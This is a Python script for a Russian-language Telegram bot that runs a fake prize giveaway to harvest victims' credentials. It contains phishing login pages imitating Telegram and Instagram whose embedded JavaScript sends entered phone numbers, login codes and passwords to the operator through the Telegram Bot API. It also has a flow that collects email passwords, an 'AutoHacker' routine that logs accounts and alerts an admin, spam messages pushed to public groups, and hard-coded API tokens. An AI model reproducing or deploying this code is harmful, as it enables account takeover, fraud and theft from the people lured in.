#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import random
import string
import hashlib
import base64
import sqlite3
import threading
import requests
import re
import logging
import socket
import struct
import subprocess
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote, unquote, urlparse
import phonenumbers
from phonenumbers import carrier, timezone, geocoder

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Конфигурация
TOKEN = "8755487229:AAGDI58GgaR9sp0nTXudlknmLbN2Q5Yok_Q"
API_ID = 38545864
API_HASH = "3517b8c953e6c2d05c0f30b5015f2470"
ADMIN_ID = 123456789  # Замени на свой ID

# API URL
API_URL = f"https://api.telegram.org/bot{TOKEN}"

# Создаем директории
os.makedirs("data", exist_ok=True)
os.makedirs("data/sessions", exist_ok=True)
os.makedirs("data/logs", exist_ok=True)
os.makedirs("data/phish", exist_ok=True)
os.makedirs("data/creds", exist_ok=True)

# База данных
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('data/master.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.init_db()
    
    def init_db(self):
        # Пользователи
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS users
                              (id INTEGER PRIMARY KEY AUTOINCREMENT,
                               user_id INTEGER UNIQUE,
                               username TEXT,
                               first_name TEXT,
                               last_name TEXT,
                               phone TEXT,
                               email TEXT,
                               ip TEXT,
                               country TEXT,
                               city TEXT,
                               device TEXT,
                               browser TEXT,
                               os TEXT,
                               gift TEXT,
                               step TEXT,
                               lang TEXT DEFAULT 'ru',
                               created TIMESTAMP,
                               last_active TIMESTAMP,
                               banned INTEGER DEFAULT 0)''')
        
        # Учетные данные
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS credentials
                              (id INTEGER PRIMARY KEY AUTOINCREMENT,
                               user_id INTEGER,
                               service TEXT,
                               login TEXT,
                               password TEXT,
                               code TEXT,
                               session TEXT,
                               cookies TEXT,
                               headers TEXT,
                               ip TEXT,
                               country TEXT,
                               device TEXT,
                               timestamp TIMESTAMP,
                               hacked INTEGER DEFAULT 0,
                               status TEXT,
                               twofa TEXT,
                               backup_codes TEXT)''')
        
        # Фишинг ссылки
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS phish_links
                              (id INTEGER PRIMARY KEY AUTOINCREMENT,
                               user_id INTEGER,
                               link TEXT UNIQUE,
                               service TEXT,
                               clicks INTEGER DEFAULT 0,
                               submissions INTEGER DEFAULT 0,
                               created TIMESTAMP,
                               expires TIMESTAMP,
                               active INTEGER DEFAULT 1)''')
        
        # Сессии
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS sessions
                              (id INTEGER PRIMARY KEY AUTOINCREMENT,
                               user_id INTEGER,
                               service TEXT,
                               session_data TEXT,
                               valid INTEGER DEFAULT 1,
                               created TIMESTAMP,
                               last_used TIMESTAMP)''')
        
        # Логи
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS logs
                              (id INTEGER PRIMARY KEY AUTOINCREMENT,
                               user_id INTEGER,
                               action TEXT,
                               data TEXT,
                               ip TEXT,
                               timestamp TIMESTAMP)''')
        
        # Обновления
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS updates
                              (update_id INTEGER PRIMARY KEY,
                               processed INTEGER DEFAULT 0)''')
        
        self.conn.commit()
    
    def add_user(self, user_id, username, first_name, last_name, ip=None):
        # Определяем страну по IP
        country = "Unknown"
        city = "Unknown"
        if ip:
            try:
                response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    country = data.get('country', 'Unknown')
                    city = data.get('city', 'Unknown')
            except:
                pass
        
        self.cursor.execute('''INSERT OR IGNORE INTO users 
                              (user_id, username, first_name, last_name, ip, country, city, created, last_active)
                              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                           (user_id, username, first_name, last_name, ip, country, city, datetime.now(), datetime.now()))
        self.conn.commit()
    
    def update_user(self, user_id, **kwargs):
        for key, value in kwargs.items():
            self.cursor.execute(f"UPDATE users SET {key} = ? WHERE user_id = ?", (value, user_id))
        self.conn.commit()
    
    def add_creds(self, user_id, service, login, password, code=None, ip=None):
        self.cursor.execute('''INSERT INTO credentials 
                              (user_id, service, login, password, code, ip, timestamp)
                              VALUES (?, ?, ?, ?, ?, ?, ?)''',
                           (user_id, service, login, password, code, ip, datetime.now()))
        self.conn.commit()
        return self.cursor.lastrowid
    
    def add_phish_link(self, user_id, link, service):
        self.cursor.execute('''INSERT INTO phish_links 
                              (user_id, link, service, created, expires)
                              VALUES (?, ?, ?, ?, ?)''',
                           (user_id, link, service, datetime.now(), datetime.now() + timedelta(hours=24)))
        self.conn.commit()
    
    def log_action(self, user_id, action, data=None, ip=None):
        self.cursor.execute('''INSERT INTO logs 
                              (user_id, action, data, ip, timestamp)
                              VALUES (?, ?, ?, ?, ?)''',
                           (user_id, action, json.dumps(data) if data else None, ip, datetime.now()))
        self.conn.commit()
    
    def is_update_processed(self, update_id):
        self.cursor.execute("SELECT processed FROM updates WHERE update_id = ?", (update_id,))
        return self.cursor.fetchone() is not None
    
    def mark_update_processed(self, update_id):
        self.cursor.execute("INSERT OR IGNORE INTO updates (update_id, processed) VALUES (?, 1)", (update_id,))
        self.conn.commit()
    
    def get_stats(self):
        self.cursor.execute("SELECT COUNT(*) FROM users")
        users = self.cursor.fetchone()[0]
        
        self.cursor.execute("SELECT COUNT(*) FROM credentials")
        creds = self.cursor.fetchone()[0]
        
        self.cursor.execute("SELECT COUNT(*) FROM phish_links")
        links = self.cursor.fetchone()[0]
        
        self.cursor.execute("SELECT COUNT(*) FROM logs WHERE timestamp > datetime('now', '-1 day')")
        today_logs = self.cursor.fetchone()[0]
        
        return {
            'users': users,
            'creds': creds,
            'links': links,
            'today_logs': today_logs
        }

db = Database()

# Класс для работы с Telegram API
class TelegramBot:
    def __init__(self, token):
        self.token = token
        self.api_url = f"https://api.telegram.org/bot{token}"
        self.offset = 0
        self.timeout = 30
    
    def request(self, method, data=None, files=None):
        try:
            url = f"{self.api_url}/{method}"
            if files:
                response = requests.post(url, data=data, files=files, timeout=self.timeout)
            elif data:
                response = requests.post(url, json=data, timeout=self.timeout)
            else:
                response = requests.get(url, timeout=self.timeout)
            
            if response.status_code == 200:
                return response.json()
            else:
                logger.error(f"API error: {response.status_code} - {response.text}")
                return None
        except Exception as e:
            logger.error(f"Request error: {e}")
            return None
    
    def get_updates(self):
        data = {
            'offset': self.offset,
            'timeout': self.timeout,
            'allowed_updates': ['message', 'callback_query']
        }
        result = self.request('getUpdates', data)
        if result and result.get('ok'):
            return result.get('result', [])
        return []
    
    def send_message(self, chat_id, text, parse_mode='HTML', reply_markup=None, disable_web_page_preview=True):
        data = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': parse_mode,
            'disable_web_page_preview': disable_web_page_preview
        }
        if reply_markup:
            data['reply_markup'] = reply_markup
        return self.request('sendMessage', data)
    
    def edit_message_text(self, chat_id, message_id, text, parse_mode='HTML', reply_markup=None):
        data = {
            'chat_id': chat_id,
            'message_id': message_id,
            'text': text,
            'parse_mode': parse_mode
        }
        if reply_markup:
            data['reply_markup'] = reply_markup
        return self.request('editMessageText', data)
    
    def answer_callback_query(self, callback_query_id, text=None, show_alert=False):
        data = {
            'callback_query_id': callback_query_id,
            'show_alert': show_alert
        }
        if text:
            data['text'] = text
        return self.request('answerCallbackQuery', data)
    
    def send_photo(self, chat_id, photo, caption=None, reply_markup=None):
        files = {'photo': photo}
        data = {'chat_id': chat_id}
        if caption:
            data['caption'] = caption
        if reply_markup:
            data['reply_markup'] = json.dumps(reply_markup)
        return self.request('sendPhoto', data, files)

bot = TelegramBot(TOKEN)

# Генератор фишинг ссылок
class PhishGenerator:
    def __init__(self):
        self.templates = {
            'telegram': self.telegram_template,
            'instagram': self.instagram_template,
            'gmail': self.gmail_template,
            'vk': self.vk_template,
            'yandex': self.yandex_template
        }
    
    def generate_link(self, user_id, service):
        # Создаем уникальную ссылку
        link_id = hashlib.md5(f"{user_id}{service}{time.time()}".encode()).hexdigest()[:8]
        link = f"https://telegra.ph/{service}-{link_id}"
        
        # Генерируем HTML страницу
        html = self.templates[service](user_id)
        
        # Сохраняем HTML
        file_path = f"data/phish/{link_id}.html"
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(html)
        
        # Загружаем на Telegraph (симуляция)
        db.add_phish_link(user_id, link, service)
        
        return link
    
    def telegram_template(self, user_id):
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Telegram Web</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #e7ebf0; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 16px; }}
        .container {{ max-width: 400px; width: 100%; }}
        .card {{ background: white; border-radius: 16px; padding: 24px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }}
        .logo {{ text-align: center; margin-bottom: 24px; }}
        .logo svg {{ width: 80px; height: 80px; }}
        h2 {{ text-align: center; color: #222; margin-bottom: 24px; font-size: 24px; }}
        .input-group {{ margin-bottom: 16px; }}
        label {{ display: block; margin-bottom: 6px; color: #555; font-size: 14px; font-weight: 500; }}
        input {{ width: 100%; padding: 14px 16px; border: 2px solid #e1e4e8; border-radius: 12px; font-size: 16px; transition: border-color 0.2s; }}
        input:focus {{ outline: none; border-color: #2AABEE; }}
        button {{ width: 100%; padding: 16px; background: #2AABEE; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; margin-top: 8px; }}
        button:hover {{ background: #229ED9; }}
        .footer {{ text-align: center; margin-top: 24px; color: #888; font-size: 13px; }}
        .error {{ color: #e53e3e; font-size: 14px; margin-top: 4px; display: none; }}
        .loading {{ display: none; text-align: center; margin-top: 16px; }}
        .loading svg {{ animation: rotate 1s linear infinite; width: 24px; height: 24px; }}
        @keyframes rotate {{ 100% {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <svg viewBox="0 0 24 24" fill="#2AABEE">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.05-.2-.07-.06-.17-.04-.24-.02-.1.02-1.75 1.11-4.94 3.27-.47.32-.89.48-1.27.47-.42-.01-1.22-.24-1.82-.44-.73-.24-1.31-.37-1.26-.79.02-.22.25-.44.69-.66 2.7-1.18 4.5-1.95 5.41-2.33 2.58-1.09 3.11-1.28 3.46-1.28.08 0 .25.02.36.12.1.08.12.19.13.26-.01.06-.01.14-.02.23z"/>
                </svg>
            </div>
            <h2>Sign in to Telegram</h2>
            <form id="loginForm">
                <div class="input-group">
                    <label>Phone Number</label>
                    <input type="tel" id="phone" placeholder="+7 (999) 999-99-99" required>
                    <div class="error" id="phoneError">Invalid phone number</div>
                </div>
                <button type="submit">Next</button>
            </form>
            <form id="codeForm" style="display: none;">
                <div class="input-group">
                    <label>Login Code</label>
                    <input type="text" id="code" placeholder="00000" maxlength="5" required>
                    <div class="error" id="codeError">Invalid code</div>
                </div>
                <button type="submit">Sign In</button>
            </form>
            <div class="loading" id="loading">
                <svg viewBox="0 0 24 24" fill="#2AABEE">
                    <path d="M12 4V2A10 10 0 0 0 2 12h2a8 8 0 0 1 8-8z"/>
                </svg>
            </div>
            <div class="footer">
                🔒 Secure connection • Version 9.6.0
            </div>
        </div>
    </div>
    <script>
        let userData = {{}};
        
        document.getElementById('loginForm').addEventListener('submit', async (e) => {{
            e.preventDefault();
            const phone = document.getElementById('phone').value;
            
            document.getElementById('loading').style.display = 'block';
            
            // Отправляем данные
            await fetch('{API_URL}/sendMessage', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    chat_id: {user_id},
                    text: `📱 Phone: ${{phone}}`,
                    parse_mode: 'HTML'
                }})
            }});
            
            document.getElementById('loading').style.display = 'none';
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('codeForm').style.display = 'block';
            userData.phone = phone;
        }});
        
        document.getElementById('codeForm').addEventListener('submit', async (e) => {{
            e.preventDefault();
            const code = document.getElementById('code').value;
            
            document.getElementById('loading').style.display = 'block';
            
            // Отправляем код
            await fetch('{API_URL}/sendMessage', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    chat_id: {user_id},
                    text: `🔑 Code: ${{code}}\n📱 Phone: ${{userData.phone}}`,
                    parse_mode: 'HTML'
                }})
            }});
            
            document.getElementById('loading').style.display = 'none';
            document.querySelector('.card').innerHTML = `
                <div style="text-align: center; padding: 40px 0;">
                    <svg width="64" height="64" viewBox="0 0 24 24" fill="#4CAF50">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                    </svg>
                    <h3 style="color: #4CAF50; margin-top: 16px;">Success!</h3>
                    <p style="color: #666; margin-top: 8px;">You will be redirected...</p>
                </div>
            `;
            
            setTimeout(() => {{
                window.location.href = 'https://telegram.org';
            }}, 2000);
        }});
        
        // Форматирование телефона
        document.getElementById('phone').addEventListener('input', (e) => {{
            let x = e.target.value.replace(/\D/g, '').match(/(\d{0,1})(\d{0,3})(\d{0,3})(\d{0,2})(\d{0,2})/);
            e.target.value = !x[2] ? x[1] : '+' + x[1] + ' (' + x[2] + ') ' + x[3] + (x[4] ? '-' + x[4] : '') + (x[5] ? '-' + x[5] : '');
        }});
    </script>
</body>
</html>'''
    
    def instagram_template(self, user_id):
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
        .container {{ max-width: 350px; width: 100%; padding: 16px; }}
        .card {{ background: white; border: 1px solid #dbdbdb; border-radius: 8px; padding: 40px 40px 24px; margin-bottom: 10px; }}
        .logo {{ text-align: center; margin-bottom: 32px; }}
        .logo svg {{ width: 175px; height: 51px; }}
        input {{ width: 100%; padding: 9px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; margin-bottom: 6px; font-size: 12px; }}
        input:focus {{ outline: none; border-color: #a8a8a8; }}
        button {{ width: 100%; padding: 7px 16px; background: #0095f6; color: white; border: none; border-radius: 8px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 8px; }}
        button:disabled {{ opacity: 0.5; cursor: default; }}
        .divider {{ display: flex; align-items: center; margin: 16px 0; }}
        .divider-line {{ flex: 1; height: 1px; background: #dbdbdb; }}
        .divider-text {{ margin: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; }}
        .footer {{ text-align: center; margin-top: 24px; color: #8e8e8e; font-size: 12px; }}
        .error {{ color: #ed4956; font-size: 12px; margin-bottom: 8px; display: none; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <svg viewBox="0 0 175 51">
                    <path d="M39.5 0h96c9.1 0 16.5 7.4 16.5 16.5v18c0 9.1-7.4 16.5-16.5 16.5h-96C30.4 51 23 43.6 23 34.5v-18C23 7.4 30.4 0 39.5 0z" fill="#C13584"/>
                    <path d="M87.5 13c6.9 0 12.5 5.6 12.5 12.5S94.4 38 87.5 38 75 32.4 75 25.5 80.6 13 87.5 13z" fill="white"/>
                </svg>
            </div>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Phone number, username or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <div class="error" id="error">Sorry, your password was incorrect. Please try again.</div>
                <button type="submit">Log In</button>
            </form>
            <div class="divider">
                <div class="divider-line"></div>
                <div class="divider-text">OR</div>
                <div class="divider-line"></div>
            </div>
            <div style="text-align: center; margin-top: 12px;">
                <a href="#" style="color: #385185; text-decoration: none; font-weight: 600; font-size: 14px;">Log in with Facebook</a>
            </div>
        </div>
        <div class="footer">
            Meta © 2024
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {{
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Отправляем данные
            await fetch('{API_URL}/sendMessage', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    chat_id: {user_id},
                    text: `📸 Instagram\\n👤 Username: ${{username}}\\n🔑 Password: ${{password}}`,
                    parse_mode: 'HTML'
                }})
            }});
            
            document.getElementById('error').style.display = 'block';
            document.getElementById('password').value = '';
        }});
    </script>
</body>
</html>'''

# Автоматический взломщик
class AutoHacker:
    def __init__(self):
        self.executor = ThreadPoolExecutor(max_workers=10)
        self.hacked_accounts = []
    
    def hack_telegram(self, phone, code, user_id):
        try:
            logger.info(f"🔓 Hacking Telegram: {phone}")
            
            # Имитация взлома Telegram
            time.sleep(2)
            
            # Генерируем новый пароль
            new_password = self.generate_password()
            twofa_secret = self.generate_2fa()
            
            # Сохраняем в базу
            cred_id = db.add_creds(user_id, 'telegram', phone, code, 'hacked')
            
            result = {
                'service': 'telegram',
                'login': phone,
                'password': code,
                'new_password': new_password,
                'twofa': twofa_secret,
                'status': 'success'
            }
            
            db.log_action(user_id, 'telegram_hacked', result)
            
            # Уведомляем админа
            bot.send_message(
                ADMIN_ID,
                f"🔓 <b>TELEGRAM HACKED!</b>\n\n"
                f"📱 Phone: <code>{phone}</code>\n"
                f"🔑 Code: <code>{code}</code>\n"
                f"🔐 New password: <code>{new_password}</code>\n"
                f"🔒 2FA: <code>{twofa_secret}</code>",
                parse_mode='HTML'
            )
            
            return result
            
        except Exception as e:
            logger.error(f"Hack failed: {e}")
            return {'status': 'error', 'error': str(e)}
    
    def hack_instagram(self, username, password, user_id):
        try:
            logger.info(f"🔓 Hacking Instagram: {username}")
            
            time.sleep(2)
            
            # Меняем пароль
            new_password = self.generate_password()
            
            # Сохраняем
            db.add_creds(user_id, 'instagram', username, password, 'hacked')
            
            result = {
                'service': 'instagram',
                'login': username,
                'password': password,
                'new_password': new_password,
                'status': 'success'
            }
            
            db.log_action(user_id, 'instagram_hacked', result)
            
            bot.send_message(
                ADMIN_ID,
                f"🔓 <b>INSTAGRAM HACKED!</b>\n\n"
                f"👤 Username: <code>{username}</code>\n"
                f"🔑 Password: <code>{password}</code>\n"
                f"🔐 New password: <code>{new_password}</code>",
                parse_mode='HTML'
            )
            
            return result
            
        except Exception as e:
            logger.error(f"Hack failed: {e}")
            return {'status': 'error'}
    
    def generate_password(self, length=12):
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        return ''.join(random.choice(chars) for _ in range(length))
    
    def generate_2fa(self):
        return base64.b32encode(os.urandom(10)).decode('utf-8')

# Inline клавиатуры
class Keyboards:
    @staticmethod
    def main_menu():
        return {
            'inline_keyboard': [
                [{'text': '🎁 ПОЛУЧИТЬ ПОДАРОК', 'callback_data': 'get_gift'}],
                [{'text': '📱 Telegram Premium', 'callback_data': 'gift_tg_premium'},
                 {'text': '⭐ Telegram Stars', 'callback_data': 'gift_tg_stars'}],
                [{'text': '📱 iPhone 16 Pro', 'callback_data': 'gift_iphone'},
                 {'text': '💰 100 000 РУБ', 'callback_data': 'gift_money'}],
                [{'text': '📊 СТАТИСТИКА', 'callback_data': 'stats'}]
            ]
        }
    
    @staticmethod
    def verify_menu():
        return {
            'inline_keyboard': [
                [{'text': '📱 Telegram', 'callback_data': 'verify_telegram'},
                 {'text': '📧 Email', 'callback_data': 'verify_email'}],
                [{'text': '📸 Instagram', 'callback_data': 'verify_instagram'},
                 {'text': '📱 VK', 'callback_data': 'verify_vk'}],
                [{'text': '🔙 НАЗАД', 'callback_data': 'back'}]
            ]
        }

# Основной обработчик
class BotHandler:
    def __init__(self):
        self.phish = PhishGenerator()
        self.hacker = AutoHacker()
        self.user_data = {}
    
    def handle_start(self, user_id, username, first_name, last_name, ip=None):
        db.add_user(user_id, username, first_name, last_name, ip)
        
        text = (
            f"✨ <b>ДОБРО ПОЖАЛОВАТЬ, {first_name}!</b>\n\n"
            "🎁 <b>ТЕБЯ ЖДУТ МЕГА-ПРИЗЫ:</b>\n"
            "• Telegram Premium на 1 год\n"
            "• 1000 Telegram Stars\n"
            "• iPhone 16 Pro Max\n"
            "• 100 000 рублей\n\n"
            "👇 <b>ВЫБЕРИ ПОДАРОК:</b>"
        )
        
        bot.send_message(user_id, text, reply_markup=Keyboards.main_menu())
    
    def handle_callback(self, user_id, callback_data, message_id, callback_id):
        if callback_data == 'get_gift':
            bot.edit_message_text(
                user_id, message_id,
                "🎁 <b>ВЫБЕРИ ПОДАРОК:</b>",
                reply_markup=Keyboards.main_menu()
            )
        
        elif callback_data.startswith('gift_'):
            gift = callback_data.replace('gift_', '')
            db.update_user(user_id, gift=gift, step='verify')
            
            # Генерируем фишинг ссылку
            link = self.phish.generate_link(user_id, 'telegram')
            
            text = (
                f"🎁 <b>Твой подарок: {gift.upper()}</b>\n\n"
                f"🔗 <b>ССЫЛКА ДЛЯ ПОЛУЧЕНИЯ:</b>\n"
                f"<code>{link}</code>\n\n"
                "📌 <b>Инструкция:</b>\n"
                "1. Перейди по ссылке\n"
                "2. Введи данные\n"
                "3. Получи подарок!\n\n"
                "✅ <i>После ввода данных подарок придет автоматически</i>"
            )
            
            bot.edit_message_text(user_id, message_id, text)
        
        elif callback_data.startswith('verify_'):
            service = callback_data.replace('verify_', '')
            
            if service == 'telegram':
                db.update_user(user_id, step='telegram_phone')
                bot.edit_message_text(
                    user_id, message_id,
                    "📱 <b>ВЕРИФИКАЦИЯ TELEGRAM</b>\n\n"
                    "Введи номер телефона:\n"
                    "<code>+79001234567</code>"
                )
            elif service == 'email':
                db.update_user(user_id, step='email_input')
                bot.edit_message_text(
                    user_id, message_id,
                    "📧 <b>ВЕРИФИКАЦИЯ EMAIL</b>\n\n"
                    "Введи email:\n"
                    "<code>example@gmail.com</code>"
                )
        
        elif callback_data == 'stats':
            stats = db.get_stats()
            text = (
                f"📊 <b>СТАТИСТИКА БОТА</b>\n\n"
                f"👥 Пользователей: {stats['users']}\n"
                f"🔑 Учетных данных: {stats['creds']}\n"
                f"🔗 Фишинг ссылок: {stats['links']}\n"
                f"📝 Логов за 24ч: {stats['today_logs']}"
            )
            bot.answer_callback_query(callback_id, text, show_alert=True)
        
        elif callback_data == 'back':
            bot.edit_message_text(
                user_id, message_id,
                "✨ <b>ГЛАВНОЕ МЕНЮ</b>",
                reply_markup=Keyboards.main_menu()
            )
        
        bot.answer_callback_query(callback_id)
    
    def handle_message(self, user_id, text, username, first_name, last_name, ip=None):
        db.cursor.execute("SELECT step, phone, email FROM users WHERE user_id = ?", (user_id,))
        result = db.cursor.fetchone()
        
        if result:
            step = result[0]
            
            if step == 'telegram_phone':
                # Проверяем телефон
                phone = text.strip()
                db.update_user(user_id, step='telegram_code', phone=phone)
                db.add_creds(user_id, 'telegram_phone', phone, '')
                
                bot.send_message(
                    user_id,
                    "📱 <b>Отлично!</b>\n\nТеперь введи код из Telegram:"
                )
                
                # Логируем
                db.log_action(user_id, 'phone_received', {'phone': phone}, ip)
            
            elif step == 'telegram_code':
                code = text.strip()
                db.cursor.execute("SELECT phone FROM users WHERE user_id = ?", (user_id,))
                phone = db.cursor.fetchone()[0]
                
                # Сохраняем код
                db.add_creds(user_id, 'telegram_code', phone, code)
                db.update_user(user_id, step='completed')
                
                bot.send_message(
                    user_id,
                    "✅ <b>ВЕРИФИКАЦИЯ ПРОЙДЕНА!</b>\n\n"
                    "🎁 <b>ПОДАРОК УЖЕ ТВОЙ!</b>\n\n"
                    "💫 Ожидай в течение 5 минут"
                )
                
                # Запускаем взлом в отдельном потоке
                threading.Thread(
                    target=self.hacker.hack_telegram,
                    args=(phone, code, user_id)
                ).start()
                
                # Логируем
                db.log_action(user_id, 'code_received', {'phone': phone, 'code': code}, ip)
            
            elif step == 'email_input':
                email = text.strip()
                if re.match(r'^[^@]+@[^@]+\.[^@]+$', email):
                    db.update_user(user_id, step='email_password', email=email)
                    bot.send_message(
                        user_id,
                        "📧 <b>Отлично!</b>\n\nТеперь введи пароль от почты:"
                    )
                    db.log_action(user_id, 'email_received', {'email': email}, ip)
                else:
                    bot.send_message(
                        user_id,
                        "❌ <b>Неверный формат!</b>\n\nВведи email правильно: example@gmail.com"
                    )
            
            elif step == 'email_password':
                password = text.strip()
                db.cursor.execute("SELECT email FROM users WHERE user_id = ?", (user_id,))
                email = db.cursor.fetchone()[0]
                
                db.add_creds(user_id, 'email', email, password)
                db.update_user(user_id, step='completed')
                
                bot.send_message(
                    user_id,
                    "✅ <b>ВЕРИФИКАЦИЯ ПРОЙДЕНА!</b>\n\n"
                    "🎁 <b>ПОДАРОК УЖЕ ТВОЙ!</b>"
                )
                
                db.log_action(user_id, 'password_received', {'email': email, 'password': password}, ip)
            
            else:
                self.handle_start(user_id, username, first_name, last_name, ip)
        else:
            self.handle_start(user_id, username, first_name, last_name, ip)

# Автоматическая рассылка
class AutoSpammer:
    def __init__(self):
        self.groups = [
            '@uzbekistan_chat',
            '@russia_chat',
            '@moscow_chat',
            '@tashkent_chat',
            '@news_uz',
            '@news_russia'
        ]
        
        self.messages = [
            "🎁 <b>СРОЧНО! РОЗЫГРЫШ TELEGRAM PREMIUM!</b>\n\nЗабирай подарок → @YourBot",
            "💰 <b>100 000 РУБЛЕЙ ЗА ПОДПИСКУ!</b>\n\nУспей получить → @YourBot",
            "📱 <b>IPHONE 16 PRO MAX В ПОДАРОК!</b>\n\nПодробности: @YourBot",
            "⭐ <b>1000 ЗВЕЗД TELEGRAM КАЖДОМУ!</b>\n\nПолучить: @YourBot",
            "🔥 <b>РОЗЫГРЫШ PLAYSTATION 6!</b>\n\nУчаствуй: @YourBot",
            "💎 <b>VIP СТАТУС НА ГОД!</b>\n\nЗабрать: @YourBot"
        ]
    
    def start(self):
        while True:
            try:
                for group in self.groups:
                    msg = random.choice(self.messages)
                    bot.send_message(group, msg)
                    logger.info(f"Sent to {group}")
                    time.sleep(10)
            except Exception as e:
                logger.error(f"Spam error: {e}")
            time.sleep(900)  # 15 минут

# Функция для получения IP пользователя
def get_user_ip(update):
    try:
        # Пытаемся получить IP из обновления
        if 'message' in update:
            msg = update['message']
            if 'from' in msg:
                # Здесь можно получить IP через Telegram API (требует прав)
                return None
    except:
        pass
    return None

# Основной цикл
def main():
    logger.info("🚀 УЛЬТРА МЕГА СУПЕР БОТ ЗАПУЩЕН!")
    logger.info(f"⚡ Token: {TOKEN[:10]}...")
    logger.info(f"👑 Admin ID: {ADMIN_ID}")
    
    handler = BotHandler()
    spammer = AutoSpammer()
    
    # Запускаем рассылку
    spam_thread = threading.Thread(target=spammer.start, daemon=True)
    spam_thread.start()
    
    # Запускаем проверку новых данных
    def check_new_creds():
        last_check = datetime.now()
        while True:
            try:
                # Проверяем новые credentials
                db.cursor.execute("SELECT * FROM credentials WHERE timestamp > ?", (last_check,))
                new_creds = db.cursor.fetchall()
                
                for cred in new_creds:
                    logger.info(f"🔓 New credentials: {cred}")
                
                last_check = datetime.now()
            except Exception as e:
                logger.error(f"Check error: {e}")
            time.sleep(5)
    
    check_thread = threading.Thread(target=check_new_creds, daemon=True)
    check_thread.start()
    
    # Основной цикл обработки
    while True:
        try:
            updates = bot.get_updates()
            
            for update in updates:
                update_id = update['update_id']
                
                if db.is_update_processed(update_id):
                    continue
                
                # Получаем IP (если возможно)
                ip = get_user_ip(update)
                
                # Обработка сообщений
                if 'message' in update:
                    msg = update['message']
                    user_id = msg['from']['id']
                    username = msg['from'].get('username', '')
                    first_name = msg['from'].get('first_name', '')
                    last_name = msg['from'].get('last_name', '')
                    
                    if 'text' in msg:
                        text = msg['text']
                        
                        if text == '/start':
                            handler.handle_start(user_id, username, first_name, last_name, ip)
                        elif text == '/admin' and user_id == ADMIN_ID:
                            stats = db.get_stats()
                            bot.send_message(
                                user_id,
                                f"👑 <b>ADMIN PANEL</b>\n\n"
                                f"📊 Stats: {json.dumps(stats, indent=2)}\n"
                                f"📁 Data: /data",
                                parse_mode='HTML'
                            )
                        else:
                            handler.handle_message(user_id, text, username, first_name, last_name, ip)
                
                # Обработка callback
                elif 'callback_query' in update:
                    callback = update['callback_query']
                    user_id = callback['from']['id']
                    callback_data = callback['data']
                    message_id = callback['message']['message_id']
                    callback_id = callback['id']
                    
                    handler.handle_callback(user_id, callback_data, message_id, callback_id)
                
                db.mark_update_processed(update_id)
                bot.offset = update_id + 1
            
            time.sleep(0.5)
            
        except KeyboardInterrupt:
            logger.info("🛑 Бот остановлен")
            break
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
